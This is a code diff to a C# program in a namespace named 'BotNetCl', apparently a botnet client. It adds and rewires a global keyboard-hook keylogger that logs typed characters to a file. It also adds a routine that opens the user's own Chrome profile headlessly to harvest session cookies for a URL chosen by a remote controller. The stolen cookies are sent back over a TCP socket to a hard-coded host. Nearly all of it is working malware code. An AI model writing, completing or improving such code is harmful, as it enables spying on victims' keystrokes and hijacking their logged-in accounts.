@@ -105,16 +105,87 @@ namespace BotNetCl
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
+
+        static bool capsLockIsOn()
+        {
+            return Control.IsKeyLocked(System.Windows.Forms.Keys.CapsLock);
+        }
+      
+        static bool checkWrite(int vkCode)
+        {
+            if (vkCode >= 48 && vkCode <= 57 ) // 0-9
+            {
+                return true;
+            }
+            else if (vkCode >= 65 && vkCode <= 90) //A-Z
+            {
+                return true;
+            }
+            else if(vkCode >= 97 && vkCode <= 122) // a-z
+            {
+                return true;
+            }
+            else if(vkCode == 32) // space
+            {
+                return true;
+            }    
+            return false;
+        }
+
         static void WriteLog(int vkCode)
         {
-            Console.InputEncoding = Encoding.UTF8;
-            Console.OutputEncoding = Encoding.UTF8;
-            Console.Write((char)vkCode);
+            //Console.InputEncoding = Encoding.UTF8;
+            //Console.OutputEncoding = Encoding.UTF8;
+            //Console.Write((char)vkCode);
+            //Console.Write(vkCode);
 
-
-            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+            string logNameToWrite = "keylogger" + logExtendtion;
             StreamWriter sw = new StreamWriter(logNameToWrite, true);
-            sw.Write((char)vkCode);
+
+            //Console.Write(vkCode);Console.Write(" ");
+            //Console.WriteLine((char)vkCode);
+
+            if (Control.ModifierKeys == System.Windows.Forms.Keys.Shift)
+            {
+                if (vkCode == 49) { sw.Write("!"); Console.Write("!"); }//shift 1
+                else if (vkCode == 50) { sw.Write("@"); Console.Write("@"); }//shift 2
+                else if (vkCode == 51) { sw.Write("#"); Console.Write("#"); }//shift 3
+                else if (vkCode == 52) { sw.Write("$"); Console.Write("$"); }//shift 4
+                else if (vkCode == 53) { sw.Write("%"); Console.Write("%"); }//shift 5
+                else if (vkCode == 54) { sw.Write("^"); Console.Write("^"); }//shift 6
+                else if (vkCode == 55) { sw.Write("&"); Console.Write("&"); }//shift 7
+                else if (vkCode == 56) { sw.Write("*"); Console.Write("*"); }//shift 8
+                else if (vkCode == 57) { sw.Write("("); Console.Write("("); }//shift 9
+                else if (vkCode == 48) { sw.Write(")"); Console.Write(")"); }//shift 0
+                else
+                {
+
+                    if (checkWrite(vkCode))
+                    {
+                        Console.Write((char)vkCode);
+                        sw.Write((char)vkCode);
+                    }
+                }
+
+            }
+            else
+            {
+                if (vkCode >= 65 && vkCode <= 90)
+                {
+                    vkCode += 32;
+                }
+
+                if (checkWrite(vkCode))
+                {
+                    Console.Write((char)vkCode);
+                    // sw.Write(" ");
+                    sw.Write((char)vkCode);
+                }
+            }
+
+
+
+
             sw.Close();
         }
 
@@ -306,21 +377,21 @@ namespace BotNetCl
             Console.Read();
         }
 
-        public static void getCookies(string url)
+        public static void getCookies(IWebDriver driver, string url)
         {
-            ChromeOptions options = new ChromeOptions();
-            string username = RunCommandAndGetOutput("echo %username%").Trim();
-            string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
+            //ChromeOptions options = new ChromeOptions();
+            //string username = RunCommandAndGetOutput("echo %username%").Trim();
+            //string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
 
-            Console.WriteLine(path);
-            options.AddArguments(path, "headless");
-            // options.AddArgument("--enable - automation");
-            // options.AddArguments("user-data-dir=C:/Users/ADMIN/AppData/Local/Google/Chrome/User Data");
-            //, "--headless"
-            //options.AddArgument("headless");
-            // options.AddArgument("user-data-dir=C:/Users/[username]/AppData/Local/Google/Chrome/User Data");
+            //// options.AddArguments("user-data-dir=C:/Users/ADMIN/AppData/Local/Google/Chrome/User Data");
+            ////Console.WriteLine(path);
+            //options.AddArguments(path, "headless");
+            //// options.AddArgument("--enable - automation");
+            ////, "--headless"
+            ////options.AddArgument("headless");
+            //// options.AddArgument("user-data-dir=C:/Users/[username]/AppData/Local/Google/Chrome/User Data");
 
-            IWebDriver driver = new ChromeDriver(options);
+            //IWebDriver driver = new ChromeDriver(options);
 
             try
             {
@@ -340,7 +411,7 @@ namespace BotNetCl
                     // Console.Write($"{cookie.Name}={cookie.Value};");
 
                 }
-                string logNameToWrite = "cookies"  + logExtendtion;
+                string logNameToWrite = "cookies1"  + logExtendtion;
                 StreamWriter sw = new StreamWriter(logNameToWrite, true);
                 sw.WriteLine(DateTime.Now);
                 sw.WriteLine(url);
@@ -351,7 +422,7 @@ namespace BotNetCl
             }
             finally
             {
-                driver.Quit();
+                //driver.Quit();
             }
         }
 
@@ -402,7 +473,7 @@ namespace BotNetCl
 
         public static void sendFileSocket(TcpClient client)
         {
-            byte[] dataTemp = File.ReadAllBytes("cookies.txt");
+            byte[] dataTemp = File.ReadAllBytes("cookies1.txt");
             byte[] dataLength = BitConverter.GetBytes(dataTemp.Length);
 
             int bufferSize = 1024;
@@ -424,8 +495,11 @@ namespace BotNetCl
             }
             
         }
-     
         public static void Main(string[] args)
+        {
+             HookKeyboard();
+        }
+        public static void Main1(string[] args)
         {
             //getCommandPrompt();
             //Console.WriteLine(RunCommandAndGetOutput("echo %username%"));
@@ -440,22 +514,39 @@ namespace BotNetCl
 
             // string url = Console.ReadLine().Trim();
 
-            //string url = "https://www.instagram.com/";
-            //getCookies(url);
+            //string url1 = "https://www.instagram.com/";
+            //getCookies(url1);
 
             //ctrl k ctrl d format code
             // ctrl f5
 
             //  connectsocket();
 
+
+
+            //<--------------------- set up get cookies-------------------------->
+            ChromeOptions options = new ChromeOptions();
+            string username = RunCommandAndGetOutput("echo %username%").Trim();
+            string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
+
+            // options.AddArguments("user-data-dir=C:/Users/ADMIN/AppData/Local/Google/Chrome/User Data");
+            //Console.WriteLine(path);
+            options.AddArguments(path, "headless");
+            // options.AddArgument("--enable - automation");
+            //, "--headless"
+            //options.AddArgument("headless");
+            // options.AddArgument("user-data-dir=C:/Users/[username]/AppData/Local/Google/Chrome/User Data");
+
+            IWebDriver driver = new ChromeDriver(options);
+            //<---------------------end get cookies-------------------------->
             try
             {
                 TcpClient client = new TcpClient();
 
                 // 1. connect
-                client.Connect("192.168.50.121", PORT_NUMBER);
+                client.Connect("192.168.1.104", PORT_NUMBER);
                 Stream stream = client.GetStream();
-                
+
                 //Console.WriteLine("Connected to Y2Server.");
                 //Console.Write("Enter your name: ");
 
@@ -475,9 +566,14 @@ namespace BotNetCl
 
                     if (command.StartsWith("cookies"))
                     {
-                       // data = new byte[BUFFER_SIZE];
+                        string url = command.Split('?')[1];
+                        Console.WriteLine("a");
+                        Console.WriteLine(url);
+                        Console.WriteLine("b");
+                        getCookies(driver,url);
+                        // data = new byte[BUFFER_SIZE];
 
-                       // data = encoding.GetBytes("cookies tra ve");
+                        // data = encoding.GetBytes("cookies tra ve");
 
 
                         ////
@@ -487,8 +583,10 @@ namespace BotNetCl
 
                         //stream.Write(data, 0, data.Length);
                         sendFileSocket(client);
+
+
                         Console.WriteLine("xong cookies");
-                        
+
 
                     }
                     else if (command.StartsWith("keylogger"))
